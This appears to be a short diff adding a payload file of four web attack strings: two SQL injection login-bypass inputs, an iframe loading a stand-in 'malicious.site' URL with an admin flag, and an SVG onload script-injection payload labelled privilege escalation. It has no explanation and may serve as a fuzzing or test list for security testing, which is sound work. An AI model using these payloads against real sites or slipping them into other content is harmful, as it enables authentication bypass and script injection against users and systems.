@@ -1,0 +1,4 @@
+' OR 1=1 --
+admin' OR '1'='1' --
+<iframe src="http://malicious.site/privilege?admin=true">
+<svg/onload=prompt('Privilege Escalation')>
